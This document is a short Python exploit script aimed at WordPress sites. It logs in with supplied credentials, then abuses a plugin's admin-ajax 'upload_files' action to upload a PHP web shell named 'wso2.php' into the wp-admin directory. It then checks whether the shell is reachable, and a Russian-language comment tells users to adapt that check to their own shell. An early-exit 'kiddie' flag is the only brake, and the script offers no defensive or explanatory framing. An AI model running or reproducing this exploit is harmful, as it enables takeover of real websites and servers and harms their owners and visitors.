import requests
import sys

if sys.version_info[0]==2:
    _input = raw_input
else:
    _input = input

domain = "www.example.com"
username = "hacker"
password = "31337"
file = "wso2.php"
kiddie = True
useragent = "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0"

#for tests in burp suite
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

if domain == "":
    print("Type domain:")
    domain = _input(">>").strip()
if username == "":
    print("Type username:")
    username = _input(">>").strip()
if kiddie:
    exit()
if password == "":
    print("Type password:")
    password = _input(">>").strip()
if file == "":
    print("Type filename to upload:")
    password = _input(">>").strip()


url_login = "http://"+domain+"/wp-login.php"
url_admin_ajax = "http://"+domain+"/wp-admin/admin-ajax.php"

########
# STEP 1
########
session = requests.Session()
paramsPost = {  "log":username,"testcookie":"1",
                "rememberme":"forever",
                "pwd":password,
                "redirect_to":"http://"+domain+"/wp-admin/"
                }
headers = { "Accept":"text/html",
            "User-Agent":useragent,
            "Referer":"http://"+domain+"/wp-login.php",
            "Connection":"keep-alive",
            "Content-Type":"application/x-www-form-urlencoded"
            }
r1 = session.post(url_login, data=paramsPost, headers=headers, proxies=proxies)
print("Logged in...")

########
# STEP 2
########
# Upload shell method 1
# current_plugin_root
paramsPost = { "current_plugin_root":".",
               "action":"upload_files",
               "directory":""
                }
paramsMultipart = [('file-0', (file, open(file,'rb'), 'application/octet-stream'))]
headers = { "User-Agent":useragent,
            "Accept":"application/json"
            }
r2 = session.post(url_admin_ajax, data=paramsPost, files=paramsMultipart, headers=headers, cookies=r1.cookies, proxies=proxies)
print("Try to upload shell...")

########
# STEP 3
########
r3 = session.get("http://"+domain+"/wp-admin/"+file, proxies=proxies)
#Проверка не очень, сами допишите, под свой шелл
if r3.status_code == 200:
    print("Shell uploaded: "+ "http://"+domain+"/wp-admin/"+file)
else:
    print("Exploit failed...")
